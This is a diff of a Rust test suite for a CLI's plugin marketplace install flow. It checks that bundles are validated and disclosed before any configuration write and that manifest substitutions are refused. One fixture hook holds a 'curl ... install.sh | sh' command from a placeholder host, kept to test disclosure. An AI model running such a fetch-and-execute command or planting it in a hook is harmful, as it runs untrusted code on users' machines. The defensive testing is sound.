@@ -60,6 +60,19 @@ fn manifest(dir: &Path, text: &str) {
     std::fs::write(dir.join(io_cli::pluginview::MANIFEST), text).expect("the manifest");
 }
 
+/// What io-harness makes of the bundle at `dir`, with nothing declared anywhere.
+///
+/// `Plugins::inspect` is `load_one` — the loader `Config::plugins` itself runs —
+/// reached without a `[[plugin]]` entry, so this is the same read an install does
+/// before it writes, and `Scope::User` is the scope an install writes into.
+fn read(dir: &Path) -> io_cli::pluginview::Listed {
+    io_cli::pluginview::copy_out(
+        &io_harness::Plugins::inspect(Scope::User, dir)
+            .unwrap_or_else(|error| panic!("io-harness reads {}: {error}", dir.display())),
+        true,
+    )
+}
+
 // --- F1: one name, one parse, one destination ---------------------------------
 
 /// **F1 — the slash form and the argv form are one token slice and one request.**
@@ -1179,7 +1192,7 @@ fn nothing_out_of_a_stranger_s_manifest_reaches_a_surface_unfiltered() {
         long.description.as_deref().map(str::len),
     );
 
-    let hooks = marketplace::hooks(&clone);
+    let hooks = read(&clone).hooks;
     assert_eq!(hooks.len(), 1, "{hooks:?}");
     assert_eq!(
         hooks[0].0, "every event",
@@ -1198,21 +1211,25 @@ fn nothing_out_of_a_stranger_s_manifest_reaches_a_surface_unfiltered() {
     );
 }
 
-// --- F6 to F9 and F12: disclosure before load ---------------------------------
+// --- F6, F16, F17 and F20: disclosure before anything is written ---------------
 //
 // A marketplace bundle is code from a stranger that contributes to six subsystems
-// at once, and io-harness publishes no loader that takes a directory: `load_one`
-// is private and `Plugins::load` is `pub(crate)`. The only public entry is
-// `Config::plugins()`, which sees a bundle once a configuration declares it. So
-// the install writes the entry `enabled = false`, re-discovers — io-harness has
-// now read, parsed, validated and trust-checked it, and routed it to
-// `Plugins::disabled()`, contributing nothing — and renders what it found. Consent
-// flips that one key.
+// at once. Through 0.29.0 io-harness published no loader that took a directory —
+// `load_one` was private and `Plugins::load` was `pub(crate)` — so the only way to
+// have a bundle read, parsed, validated and trust-checked was to *declare* it: the
+// install wrote a `[[plugin]]` entry `enabled = false`, re-discovered, disclosed
+// off `Plugins::disabled()`, and consent flipped the key. A bundle io-harness
+// refused therefore left its entry behind in a file the operator had agreed to
+// nothing about.
 //
-// Every test below drives that sequence with the real io-harness, because the
-// sequence IS the criterion: a disclosure io-cli composed out of the manifest
-// would name the words the manifest uses, and io-harness renames every one of them
-// before an operator can ever see it again.
+// io-harness 0.71.0 publishes `Plugins::inspect`, which is that same `load_one`
+// reached without an entry. So the read happens first, the refusal happens with
+// the configuration file untouched, and the write happens once, on consent.
+//
+// Every test below drives that against the real io-harness, because the sequence
+// IS the criterion: a disclosure io-cli composed out of the manifest would name the
+// words the manifest uses, and io-harness renames every one of them before an
+// operator can ever see it again.
 
 /// A marketplace holding one bundle whose manifest name, directory name and
 /// contribution names are all deliberately different.
@@ -1239,41 +1256,58 @@ fn holding(store: &Path) -> (Vec<Market>, PathBuf) {
     (marketplace::markets(store), dir)
 }
 
-/// Declare `dir` in `work`'s local file the way a marketplace install does, and
-/// hand back the file's own bytes.
+/// The whole of what a door does for `plugin add <name>`, **in the order it does
+/// it**, with `work`'s local file standing in for the operator's configuration.
 ///
-/// The edit is `manage::plan`'s: the same `pluginview::add_off` a typed
-/// `plugin add <name>` reaches, so nothing here is a second writer.
-fn install(work: &Path, dir: &Path) -> String {
+/// Resolve the word, ask io-harness what the directory is, and write only if it
+/// answered — `Err` short-circuits with the file exactly as it was found, which is
+/// F17. Every step is a library call and none of them is re-implemented here: the
+/// reading is `marketplace::chosen`'s, the validation and the disclosure are
+/// `marketplace::disclosure`'s, and the entry is `pluginview::add`'s, which is the
+/// same edit `manage::plan` puts on its `Plan`.
+///
+/// `manage::plan` itself cannot be driven for a bundle resolved by *name*: it
+/// reaches the marketplaces through `marketplace::installed`, which is behind
+/// `crate::home`, and moving `HOME` out from under a suite running in parallel is
+/// the thing this file's own header refuses to do. The structural gate at the
+/// bottom is what holds `plan` to this order.
+fn install(work: &Path, markets: &[Market], word: &str) -> Result<String, String> {
+    let file = work.join(io_harness::config::LOCAL_FILE);
+    let chosen = marketplace::chosen(&work.join(word), || markets.to_vec(), word)?;
+    if chosen.discloses() {
+        // The read that decides, before the file is opened for writing.
+        marketplace::disclosure(Scope::Local, chosen.dir())?;
+    }
+    let before = std::fs::read_to_string(&file).unwrap_or_default();
     let text = io_cli::edit::apply(
-        "",
-        &[io_cli::pluginview::add_off(&io_cli::pluginview::declared(
-            work, dir,
+        &before,
+        &[io_cli::pluginview::add(&io_cli::pluginview::declared(
+            work,
+            chosen.dir(),
         ))],
     )
-    .expect("the disclosing entry applies");
-    std::fs::write(work.join(io_harness::config::LOCAL_FILE), &text).expect("the configuration");
-    text
+    .expect("the entry applies");
+    std::fs::write(&file, &text).expect("the configuration");
+    Ok(text)
 }
 
-/// **F6 — the install discloses before it enables, and the disclosure is
-/// io-harness's parse.**
+/// **F6 — the install discloses before it writes, and the disclosure is
+/// io-harness's own parse of a directory nothing has declared.**
 ///
-/// The bundle is written `enabled = false`, re-discovered, and what is drawn comes
-/// off `Plugins::disabled()`'s `Plugin` accessors. Three things have to hold and
-/// each fails alone: the reading of the word was a marketplace's and so
-/// `Chosen::discloses`; the entry carries the key; and the names in the disclosure
-/// are the ones io-harness rewrote.
+/// Three things have to hold and each fails alone: the reading of the word was a
+/// marketplace's and so `Chosen::discloses`; the disclosure exists at all with no
+/// `[[plugin]]` entry anywhere; and the names in it are the ones io-harness
+/// rewrote.
 ///
 /// Sabotage: render the contributions from the manifest. The agent is called
-/// `reviewer` there and `rust-review__reviewer` after io-harness has loaded it, and
+/// `reviewer` there and `rust-review__reviewer` after io-harness has read it, and
 /// the assertion on the namespaced name fails.
 ///
-/// Second sabotage: write the entry with `pluginview::add`. `disabled()` is then
-/// empty, the bundle is loaded, and the disclosure is over something that has
-/// already contributed — the assertion that io-harness switched it off fails first.
+/// Second sabotage: go back to declaring the bundle first. The disclosure is then
+/// taken before any file exists, so a round trip through `Config::discover` finds
+/// nothing and the call fails where it now answers.
 #[test]
-fn f6_the_install_declares_off_and_discloses_the_harness_s_own_parse() {
+fn f6_the_install_discloses_the_harness_s_own_parse_before_it_writes() {
     let store = tempfile::tempdir().expect("a marketplaces directory");
     let work = tempfile::tempdir().expect("a workspace");
     let (markets, dir) = holding(store.path());
@@ -1290,40 +1324,24 @@ fn f6_the_install_declares_off_and_discloses_the_harness_s_own_parse() {
     assert!(
         chosen.discloses(),
         "a bundle out of a marketplace was read as a directory the operator wrote, \
-         so it would be declared switched on with nothing disclosed",
+         so it would be declared with nothing disclosed",
     );
     // And the other reading does not, which is what keeps `/plugin add ./some/dir`
     // on its 0.28.0 behaviour.
     assert!(
         !marketplace::Chosen::Path(dir.clone()).discloses(),
-        "a directory the operator typed would be declared off and held for consent",
+        "a directory the operator typed would be held for a consent it does not owe",
     );
 
-    let text = install(work.path(), &dir);
+    // Nothing is declared, anywhere, and the disclosure still answers.
     assert!(
-        text.contains("enabled = false"),
-        "the entry was declared switched on, so a stranger's bundle contributed to \
-         six subsystems before anyone saw what was in it: {text}",
+        !work.path().join(io_harness::config::LOCAL_FILE).exists(),
+        "the fixture starts with no configuration file at all",
     );
-
-    // io-harness's own three buckets, asserted where they are.
-    let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
-    let plugins = config.plugins();
-    assert!(plugins.is_empty(), "the bundle loaded rather than waiting");
-    assert!(plugins.dropped().is_empty(), "it was refused");
-    assert_eq!(plugins.disabled().len(), 1);
-
-    let view = io_cli::pluginview::view(&config);
-    let disclosure = marketplace::disclosure(
-        &view,
-        &dir,
-        &marketplace::hooks(&dir),
-        400,
-        &io_cli::glyphs::UNICODE,
-    )
-    .expect("io-harness read it");
+    let disclosure =
+        marketplace::disclosure(Scope::Local, &dir).expect("io-harness read the directory");
     assert_eq!(disclosure.id, "rust-review");
-    let said = disclosure.said.join("\n");
+    let said = disclosure.said(&io_cli::glyphs::UNICODE).join("\n");
     assert!(
         said.contains("rust-review__reviewer"),
         "the agent is not named as io-harness namespaced it, so the operator is \
@@ -1334,84 +1352,174 @@ fn f6_the_install_declares_off_and_discloses_the_harness_s_own_parse() {
         "the policy layer is not named as io-harness namespaced it: {said}",
     );
     assert!(
-        said.contains("switched off"),
-        "the disclosure does not say none of it is in this session: {said}",
+        !said.contains("switched off"),
+        "the disclosure describes a bundle that was declared and switched off, which \
+         is the round trip that is gone: {said}",
+    );
+
+    // And what consent then writes is one entry, switched on, in one edit.
+    let text = install(work.path(), &markets, "rust-review").expect("the install goes through");
+    assert!(
+        !text.contains("enabled"),
+        "consent wrote an `enabled` key, so the entry is the two-step declaration \
+         again: {text}",
+    );
+    // Addressed by id and never by index or count: `Config::discover` layers the
+    // developer's own `~/.io-cli/io.toml` over this workspace, so a bundle they
+    // declared is in every one of these buckets beside ours.
+    let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
+    let plugins = config.plugins();
+    assert!(
+        plugins.dropped().iter().all(|d| d.id != "rust-review"),
+        "the entry consent wrote was refused: {:?}",
+        plugins
+            .dropped()
+            .iter()
+            .map(|d| &d.error)
+            .collect::<Vec<_>>(),
+    );
+    assert!(
+        plugins.disabled().iter().all(|p| p.id() != "rust-review"),
+        "the bundle was written switched off after the operator consented",
+    );
+    assert!(
+        plugins.iter().any(|p| p.id() == "rust-review"),
+        "the bundle the operator consented to did not load",
     );
 }
 
-/// **F6, the other half — a bundle io-harness refuses is refused at this point,
-/// before consent, in its own sentence.**
+/// **F17 — nothing is written to the operator's file before the bundle is
+/// validated, and the refusal is io-harness's own sentence.**
 ///
-/// That is a property of the mechanism rather than a check written into io-cli: the
-/// file had to be declared for the disclosure to exist at all, so io-harness had
-/// already read it, and a refusal lands on `Plugins::dropped` before there is
-/// anything to consent to.
+/// Two refusals, one per kind: a manifest the deserializer refuses, and a manifest
+/// io-harness's trust rule refuses whole. Both are listed by `marketplace::markets`
+/// — a listing asks only whether a `plugin.toml` is there — so both are bundles an
+/// operator can name and neither is one io-harness will load. In both cases the
+/// configuration file — comments, unrelated sections and all — comes out of the
+/// install byte for byte as it went in, because the install never reached a write.
 ///
-/// Sabotage: answer `Ok` with an empty disclosure for a bundle nothing read. The
-/// operator is then offered "switch it on" over a bundle that will never load.
+/// Sabotage: restore the `add_off` round trip, which is what `install` above is a
+/// straight-line copy of. The entry is written before io-harness has been asked
+/// anything, so the byte comparison fails for both fixtures — and it is the refused
+/// one that motivated the change, since its entry stayed in the file for a bundle
+/// that will never load.
 #[test]
-fn f6_a_bundle_the_harness_refuses_is_refused_before_consent() {
+fn f17_a_refused_bundle_leaves_the_configuration_file_byte_for_byte_unchanged() {
+    let store = tempfile::tempdir().expect("a marketplaces directory");
     let work = tempfile::tempdir().expect("a workspace");
-    let dir = work.path().join("not-a-bundle");
-    std::fs::create_dir_all(&dir).expect("a directory with no manifest");
 
-    install(work.path(), &dir);
-    let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
-    let view = io_cli::pluginview::view(&config);
+    // A manifest a marketplace listing accepts and io-harness does not: `markets`
+    // asks only whether a `plugin.toml` is there, and `deny_unknown_fields` is one
+    // of the checks only the loader makes.
+    manifest(
+        &store
+            .path()
+            .join("zeroonething")
+            .join("ultraship")
+            .join("plugins")
+            .join("broken"),
+        "name = \"broken\"\nnot_a_key = 1\n",
+    );
+    // A manifest a committed `io.toml` may not carry: io-harness refuses the whole
+    // bundle rather than shortening it.
+    manifest(
+        &store
+            .path()
+            .join("zeroonething")
+            .join("ultraship")
+            .join("plugins")
+            .join("spawner"),
+        "name = \"spawner\"\n\n[[hook]]\non = [\"finished\"]\nrun = [\"notify\"]\n",
+    );
+    let markets = marketplace::markets(store.path());
 
-    let refusal = marketplace::disclosure(&view, &dir, &[], 400, &io_cli::glyphs::UNICODE)
-        .expect_err("io-harness refused it");
+    let before = "# the bundles this checkout loads\n\
+                  [[plugin]]\npath = \"bundles/first\"  # ours\n\n\
+                  [run]\nmax_steps = 30\n";
+    let file = work.path().join(io_harness::config::LOCAL_FILE);
+    std::fs::write(&file, before).expect("the configuration");
+
+    let refusal =
+        install(work.path(), &markets, "broken").expect_err("io-harness refused the manifest");
     assert!(
-        refusal.contains(io_cli::pluginview::MANIFEST),
-        "the refusal is not io-harness's own sentence about the file it looked \
-         for: {refusal}",
+        refusal.contains(io_cli::pluginview::MANIFEST) && refusal.contains("not_a_key"),
+        "the refusal is not io-harness's own sentence, naming the file and the key \
+         it refused: {refusal}",
     );
     assert_eq!(
-        view.refused.len(),
-        1,
-        "the refusal arrived somewhere other than the bucket `/plugin` draws",
+        std::fs::read_to_string(&file).expect("the file is still there"),
+        before,
+        "a bundle io-harness refuses changed the operator's configuration file",
+    );
+
+    // The trust rule, at the one scope that has one. `Scope::Local` is what
+    // `install` writes into, so this arm is asserted through `disclosure` directly.
+    let spawner = markets[0]
+        .bundles
+        .iter()
+        .find(|bundle| bundle.label() == "spawner")
+        .expect("the marketplace holds it");
+    let refusal = marketplace::disclosure(Scope::Project, &spawner.dir)
+        .expect_err("a committed io.toml may not name a program this machine runs");
+    assert!(
+        refusal.contains("may not contribute"),
+        "the project-scope refusal is not io-harness's own: {refusal}",
+    );
+    assert!(
+        marketplace::disclosure(Scope::User, &spawner.dir).is_ok(),
+        "the same manifest is the operator's own business in a user-scope file, and \
+         a disclosure that refused it at every scope would be io-cli's opinion",
+    );
+    assert_eq!(
+        std::fs::read_to_string(&file).expect("the file is still there"),
+        before,
+        "asking what a bundle is wrote to the operator's configuration file",
     );
 }
 
-/// **F7, the decline half — declining leaves the bundle declared, off, and
-/// visible.**
+/// **F7, the decline half — declining writes no byte at all.**
 ///
-/// The entry is not removed, and that is the difference between a decline and a
-/// bundle that quietly went away: `/plugin` lists it under `DISABLED_MARK` with
-/// what switching it on would bring, which is the one edit an operator can undo in
-/// a keystroke if they can see it.
+/// Through 0.29.0 a decline left the entry behind, switched off, because the entry
+/// was how io-harness had been made to read the bundle in the first place: the
+/// operator ended up with a `[[plugin]]` line for a directory they had just said no
+/// to. The disclosure comes from `Plugins::inspect` now, so declining is the
+/// absence of a write and the file is the file.
 ///
-/// Sabotage: remove the entry on decline. The file then carries no `[[plugin]]`,
-/// `View::is_empty` is `true`, and both assertions below fail. The structural gate
-/// under them is what makes that sabotage impossible to write in the driver: there
-/// is exactly one `pluginview::remove` call site in `src/main.rs`, the confirmed
-/// removal an operator asked for.
+/// Sabotage: declare the bundle to disclose it. The comparison below then finds the
+/// entry a decline was supposed not to leave.
+///
+/// The structural gate is the second half: `pluginview::remove` has exactly one
+/// call site in the driver — the removal an operator confirmed — so no surface can
+/// grow a second one to tidy up after a decline it should never have written.
 #[test]
-fn f7_declining_leaves_the_bundle_declared_off_and_listed() {
+fn f7_declining_writes_nothing() {
     let store = tempfile::tempdir().expect("a marketplaces directory");
     let work = tempfile::tempdir().expect("a workspace");
     let (_markets, dir) = holding(store.path());
-    let text = install(work.path(), &dir);
 
-    // Declining writes nothing at all, so the file after it is the file before it.
+    let before = "[run]\nmax_steps = 30\n";
+    let file = work.path().join(io_harness::config::LOCAL_FILE);
+    std::fs::write(&file, before).expect("the configuration");
+
+    // The whole of a decline: the disclosure is taken and the write is not made.
+    let disclosure =
+        marketplace::disclosure(Scope::Local, &dir).expect("io-harness read the directory");
+    assert_eq!(disclosure.id, "rust-review");
     assert_eq!(
-        io_cli::edit::value_at(&text, "plugin[0].enabled").as_deref(),
-        Some("false"),
+        std::fs::read_to_string(&file).expect("the file is still there"),
+        before,
+        "declining left something in the operator's configuration file",
     );
-    assert!(io_cli::edit::value_at(&text, "plugin[0].path").is_some());
 
     let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
     let view = io_cli::pluginview::view(&config);
     assert!(
-        !view.is_empty(),
-        "a configuration declaring one switched-off bundle draws an empty list, so \
-         `/plugin` says no bundles are declared over a file that declares one",
-    );
-    assert_eq!(view.plugins.len(), 1);
-    assert!(!view.plugins[0].enabled);
-    assert_eq!(
-        io_cli::pluginview::rows(&view, 400, &io_cli::glyphs::UNICODE)[0].mark,
-        Some(io_cli::pluginview::DISABLED_MARK),
+        view.plugins.iter().all(|listed| listed.id != "rust-review")
+            && view
+                .refused
+                .iter()
+                .all(|refused| refused.id != "rust-review"),
+        "a declined bundle is listed by `/plugin`, so the entry is still there",
     );
 
     let driver = code_of("src/main.rs");
@@ -1420,24 +1528,28 @@ fn f7_declining_leaves_the_bundle_declared_off_and_listed() {
         1,
         "`pluginview::remove` is called from {} places in src/main.rs, not 1. The \
          one is the removal an operator confirmed on a bundle they chose; a second \
-         is a surface taking an entry away for a reason nobody asked for — which \
-         over a decline is exactly F7's sabotage.",
+         is a surface taking an entry away for a reason nobody asked for.",
         driver.matches("pluginview::remove(").count(),
     );
 }
 
-/// **F8 — consent flips exactly one key.**
+/// **F8 — switching a declared bundle on flips exactly one key.**
+///
+/// No longer part of a marketplace install — `Plugins::inspect` ended the round
+/// trip that wrote an entry off and switched it on afterwards — but still the edit
+/// `/plugin`'s own pane makes when an operator switches back on a bundle they had
+/// switched off, which is the one edit they can undo in a keystroke.
 ///
 /// The byte comparison is the criterion. `pluginview::enable` is an `Edit::set` on
 /// `plugin[N].enabled`, and `src/edit.rs` replaces a value's own span and copies
-/// every other byte through, so the file after consent is the file before it with
-/// one word changed — comments, blank lines, the sibling entry and the unrelated
+/// every other byte through, so the file after it is the file before it with one
+/// word changed — comments, blank lines, the sibling entry and the unrelated
 /// section included.
 ///
 /// Sabotage: rewrite the entry instead of setting the key. Any rewrite reorders,
 /// re-quotes or drops one of the four things below, and the equality fails.
 #[test]
-fn f8_consent_flips_one_key_and_changes_no_other_byte() {
+fn f8_switching_a_bundle_on_flips_one_key_and_changes_no_other_byte() {
     let before = "# the bundles this checkout loads\n\
                   [[plugin]]\npath = \"bundles/first\"  # ours\n\n\
                   [run]\nmax_steps = 30\n\n\
@@ -1469,65 +1581,99 @@ fn f8_consent_flips_one_key_and_changes_no_other_byte() {
     );
 }
 
-/// **F9 — the disclosure names each hook's event and command.**
+/// **F16 — the hooks in a disclosure are io-harness's, not io-cli's reading of a
+/// manifest.**
 ///
-/// io-harness exposes no accessor for a bundle's hooks (io-harness#223), so
-/// `contributions()` answers the bare word `hooks` — and hooks are the contribution
-/// that runs programs. Consenting on that word is consenting to argv nobody has
-/// shown the operator, so the tables are read out of the manifest through
-/// `edit::value_at` and each is drawn by name.
+/// Every row comes off `Plugin::hooks()` and `Hook`'s accessors, and the two
+/// fixtures are the two shapes io-cli's own reader could never see. It counted
+/// `[[hook]]` section headers and then walked `hook[i].on` through
+/// `edit::value_at`, so an **inline `hook = [{…}]` array** was no hook at all, and
+/// a **`[[hook]]` header carrying a trailing comment** was a header the section
+/// scanner did not recognise. Both are ordinary TOML and io-harness accepts both,
+/// so a bundle that spawned programs disclosed none of them.
 ///
-/// Sabotage: fall back to `contributions()` for hooks — pass `detail` an empty
-/// slice, which is what that fallback is. The two-rows assertion fails on the one
-/// placeholder row, and the last assertion below is that same fallback asserted
-/// deliberately so the sabotage is visible rather than merely absent.
+/// (They are two bundles rather than one manifest, because TOML forbids appending
+/// a `[[hook]]` to an array a `hook = […]` already defined statically — the two
+/// spellings are alternatives, which is exactly why a reader has to handle both.)
+///
+/// Sabotage: keep the hand reader and feed it the inline-array fixture. It returns
+/// nothing where the accessor returns a hook, and the first count fails; drop the
+/// accessor rows altogether and the pane goes back to one placeholder row saying
+/// io-cli cannot say what a hook runs, which the last assertion names.
 #[test]
-fn f9_the_disclosure_names_each_hook_s_event_and_command() {
-    let store = tempfile::tempdir().expect("a marketplaces directory");
-    let work = tempfile::tempdir().expect("a workspace");
-    let dir = store
-        .path()
-        .join("zeroonething")
-        .join("guard")
-        .join("hooks");
+fn f16_every_hook_row_comes_from_the_harness_including_the_two_shapes_io_cli_could_not_read() {
+    let store = tempfile::tempdir().expect("a bundles directory");
+
+    // Shape one: an inline array of tables. No `[[hook]]` header exists to count.
+    let inline = store.path().join("inline");
     manifest(
-        &dir,
-        "name = \"guard\"\n\n\
-         [[hook]]\non = [\"tool_call\"]\nrun = [\"cargo\", \"fmt\"]\n\n\
-         [[hook]]\nat = \"before_tool\"\nrun = [\"./scripts/guard.sh\"]\n",
+        &inline,
+        "name = \"inline\"\n\n\
+         hook = [{ on = [\"tool_call\"], run = [\"cargo\", \"fmt\"] }]\n",
     );
-
-    let hooks = marketplace::hooks(&dir);
-    assert_eq!(
-        hooks.len(),
-        2,
-        "a manifest declaring two hooks produced {} rows: {hooks:?}",
-        hooks.len(),
-    );
-    assert!(hooks[0].0.contains("tool_call"), "{hooks:?}");
-    assert!(hooks[0].1.contains("cargo"), "{hooks:?}");
-    assert!(hooks[1].0.contains("before_tool"), "{hooks:?}");
-    assert!(hooks[1].1.contains("guard.sh"), "{hooks:?}");
-
-    // Declared locally: a `[[hook]]` in the committed `io.toml` is refused whole
-    // by io-harness's trust rule, which is why a marketplace install goes to a
-    // scope that is not `project`.
-    install(work.path(), &dir);
-    let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
-    let view = io_cli::pluginview::view(&config);
-    let listed = view
-        .plugins
-        .iter()
-        .find(|listed| listed.id == "guard")
-        .expect("io-harness read the bundle that was declared");
+    let listed = read(&inline);
     assert!(
         listed.contributions.contains(&"hooks"),
         "io-harness did not report hooks at all: {:?}",
         listed.contributions,
     );
+    assert_eq!(
+        listed.hooks.len(),
+        1,
+        "an inline `hook = [{{…}}]` array produced {} rows: {:?}",
+        listed.hooks.len(),
+        listed.hooks,
+    );
+    assert_eq!(listed.hooks[0].0, "tool_call", "{:?}", listed.hooks);
+    assert_eq!(listed.hooks[0].1, "[cargo fmt]", "{:?}", listed.hooks);
 
-    let named = io_cli::pluginview::detail(listed, 400, &io_cli::glyphs::UNICODE, &hooks);
-    let under_hooks: Vec<&str> = named
+    // Shape two: headers, the first carrying a trailing comment. Three hooks, and
+    // between them every accessor a row is built from.
+    let guard = store.path().join("guard");
+    manifest(
+        &guard,
+        "name = \"guard\"\n\n\
+         [[hook]]  # the one that stops a call\n\
+         at = \"before_tool\"\ntools = [\"write\"]\nrun = [\"./scripts/guard.sh\"]\n\n\
+         [[hook]]\non = []\nappend = \"trace.jsonl\"\n\n\
+         [[hook]]\non = [\"finished\"]\nrun = [\"notify\"]\non_failure = \"cancel\"\n",
+    );
+    let listed = read(&guard);
+    assert_eq!(
+        listed.hooks.len(),
+        3,
+        "a manifest declaring three hooks produced {} rows: {:?}",
+        listed.hooks.len(),
+        listed.hooks,
+    );
+    // The header with a trailing comment, its tool filter, and the `on_failure` no
+    // key wrote — a lifecycle hook that says nothing refuses the call.
+    assert_eq!(
+        listed.hooks[0].0, "before_tool on write, refuses the call if it fails",
+        "{:?}",
+        listed.hooks,
+    );
+    assert_eq!(
+        listed.hooks[0].1, "[./scripts/guard.sh]",
+        "{:?}",
+        listed.hooks,
+    );
+    // An empty `on` is every event, and a hook that logs says where.
+    assert_eq!(listed.hooks[1].0, "every event", "{:?}", listed.hooks);
+    assert!(
+        listed.hooks[1].1.contains("appends to") && listed.hooks[1].1.contains("trace.jsonl"),
+        "{:?}",
+        listed.hooks,
+    );
+    // And the one answer an operator has to see before they consent.
+    assert!(
+        listed.hooks[2].0.contains("cancels the run"),
+        "a hook that ends the run when it fails is disclosed as an ordinary one: {:?}",
+        listed.hooks,
+    );
+
+    let rows = io_cli::pluginview::detail(&listed, 400, &io_cli::glyphs::UNICODE);
+    let under_hooks: Vec<&str> = rows
         .iter()
         .skip_while(|row| !(row.heading && row.label == "hooks"))
         .skip(1)
@@ -1536,66 +1682,113 @@ fn f9_the_disclosure_names_each_hook_s_event_and_command() {
         .collect();
     assert_eq!(
         under_hooks.len(),
-        2,
+        3,
         "the group under `hooks` is not one row per hook: {under_hooks:?}",
     );
-
-    // The fallback, asserted so the sabotage is a visible difference rather than a
-    // silent one: with nothing read, the pane says what it cannot say.
-    let word = io_cli::pluginview::detail(listed, 400, &io_cli::glyphs::UNICODE, &[]);
     assert!(
-        word.iter().any(|row| row.label == "declared"
-            && row
-                .detail
-                .as_deref()
-                .is_some_and(|said| said.contains("io-harness does not expose"))),
-        "with no manifest read the pane must still say hooks were declared and that \
-         io-cli cannot say what they run",
+        !rows.iter().any(|row| row
+            .detail
+            .as_deref()
+            .is_some_and(|said| said.contains("io-harness does not expose"))),
+        "the placeholder that said io-cli could not name a hook outlived the accessor \
+         that replaced it: {rows:?}",
     );
 }
 
-/// **F9's other half — the door where consent happens never shortens the argv.**
+/// **F20 — a manifest substitution is refused and the install says so.**
 ///
-/// `pluginview::detail` cuts a row's detail to the width it is given, and the
-/// disclosure used to hand it the caller's. The argv door passes `u16::MAX` and was
-/// never shortened — and that door cannot consent; the TUI door passes the screen's
-/// width, and on eighty columns a hook's `run` array came back with an ellipsis in
-/// it. The operator then consented to a command they were shown three quarters of,
-/// on the one contribution kind that runs programs.
+/// From 0.71.0 io-harness refuses `${env:}`, `${file:}` and `${cmd:}` inside a
+/// `plugin.toml` in **every** scope, before the manifest is even deserialised: a
+/// bundle is a third party's directory even when the file naming it is the
+/// operator's own, and resolving one would read this machine — or run a program on
+/// it — for a directory nobody has agreed to yet. The value would then have been
+/// displayed, in the disclosure, as part of deciding whether to agree.
 ///
-/// A width bound buys nothing here in any case: `Disclosure::said` is written into
-/// the scrollback a line at a time, not drawn into a fixed-width picker.
-///
-/// Sabotage: fold the disclosure at the width the caller passed. Eighty columns is
-/// narrower than this argv and the assertion fails on the ellipsis.
+/// Sabotage: strip the substitution before inspecting. The refusal never happens,
+/// the install goes through, and every assertion below fails — including the one
+/// that the operator's file was never touched.
 #[test]
-fn the_door_where_consent_happens_never_shortens_a_hook_s_command() {
+fn f20_a_manifest_substitution_is_refused_in_every_scope_and_named_by_its_key() {
     let store = tempfile::tempdir().expect("a marketplaces directory");
     let work = tempfile::tempdir().expect("a workspace");
     let dir = store
         .path()
         .join("zeroonething")
+        .join("ultraship")
+        .join("plugins")
+        .join("leaky");
+    manifest(&dir, "name = \"leaky\"\ndescription = \"${env:HOME}\"\n");
+    let markets = marketplace::markets(store.path());
+
+    let before = "[run]\nmax_steps = 30\n";
+    let file = work.path().join(io_harness::config::LOCAL_FILE);
+    std::fs::write(&file, before).expect("the configuration");
+
+    let refusal = install(work.path(), &markets, "leaky")
+        .expect_err("a manifest asking for this machine's environment is refused");
+    assert!(
+        refusal.contains("description"),
+        "the refusal does not name the offending key's dotted path, so the operator \
+         has to find it themselves: {refusal}",
+    );
+    assert!(
+        refusal.contains("substitution is refused"),
+        "the refusal reads as a parse error rather than as the rule it is: {refusal}",
+    );
+    assert_eq!(
+        std::fs::read_to_string(&file).expect("the file is still there"),
+        before,
+        "a bundle refused for a substitution changed the operator's file",
+    );
+
+    // Every scope, including the two where a `[[hook]]` would have been fine.
+    for scope in [Scope::User, Scope::Local, Scope::Project] {
+        assert!(
+            marketplace::disclosure(scope, &dir).is_err(),
+            "a substitution is refused wherever the bundle is declared from, and \
+             {scope:?} accepted one",
+        );
+    }
+}
+
+/// **F16's other half — the surface where consent happens never shortens the
+/// argv.**
+///
+/// `pluginview::detail` cuts a row's detail to the width it is given, and the
+/// disclosure used to hand it the caller's — so on an eighty-column terminal a
+/// hook's `run` array came back with an ellipsis in it, and the operator consented
+/// to a command they were shown three quarters of, on the one contribution kind
+/// that runs programs. There is no width on `disclosure`'s signature to get wrong
+/// any more, and this is what says so.
+///
+/// A width bound buys nothing here in any case: `Disclosure::said` is written into
+/// the scrollback a line at a time, not drawn into a fixed-width picker.
+///
+/// Sabotage: hand `detail` a terminal width again. Eighty columns is narrower than
+/// this argv and the assertion fails on the ellipsis.
+#[test]
+fn the_surface_where_consent_happens_never_shortens_a_hook_s_command() {
+    let store = tempfile::tempdir().expect("a marketplaces directory");
+    let dir = store
+        .path()
+        .join("zeroonething")
         .join("guard")
         .join("hooks");
+    let argv = "curl -fsSL https://example.invalid/install.sh | sh --with-a-flag-nobody-read";
     manifest(
         &dir,
-        "name = \"guard\"\n\n[[hook]]\non = [\"tool_call\"]\n\
-         run = [\"bash\", \"-c\", \"curl -fsSL https://example.invalid/install.sh | \
-         sh --with-a-flag-nobody-read\"]\n",
+        &format!(
+            "name = \"guard\"\n\n[[hook]]\non = [\"tool_call\"]\n\
+             run = [\"bash\", \"-c\", \"{argv}\"]\n"
+        ),
     );
-    let hooks = marketplace::hooks(&dir);
-    assert_eq!(hooks.len(), 1, "{hooks:?}");
 
-    install(work.path(), &dir);
-    let config = io_harness::config::Config::discover(work.path()).expect("the file loads");
-    let view = io_cli::pluginview::view(&config);
-
+    let disclosure =
+        marketplace::disclosure(Scope::User, &dir).expect("io-harness read the directory");
     for glyphs in [&io_cli::glyphs::UNICODE, &io_cli::glyphs::ASCII] {
-        let disclosure = marketplace::disclosure(&view, &dir, &hooks, 80, glyphs)
-            .expect("io-harness read the bundle that was declared");
-        let said = disclosure.said.join("\n");
+        let said = disclosure.said(glyphs).join("\n");
         assert!(
-            said.contains(&hooks[0].1),
+            said.contains(argv),
             "the command reached the consent surface shortened, in {}: {said}",
             glyphs.name,
         );
@@ -1603,6 +1796,11 @@ fn the_door_where_consent_happens_never_shortens_a_hook_s_command() {
             said.contains("--with-a-flag-nobody-read"),
             "the flag at the end of the argv is the part an ellipsis takes, in {}: \
              {said}",
+            glyphs.name,
+        );
+        assert!(
+            !said.contains(glyphs.ellipsis),
+            "something on the consent surface was elided, in {}: {said}",
             glyphs.name,
         );
     }
@@ -1617,8 +1815,12 @@ fn the_door_where_consent_happens_never_shortens_a_hook_s_command() {
 /// too, and lose every setting in the file on the other machine rather than the
 /// bundle.
 ///
-/// Sabotage: drop the sentence. The constant is named by both doors, so removing it
-/// fails to compile there and fails here by name.
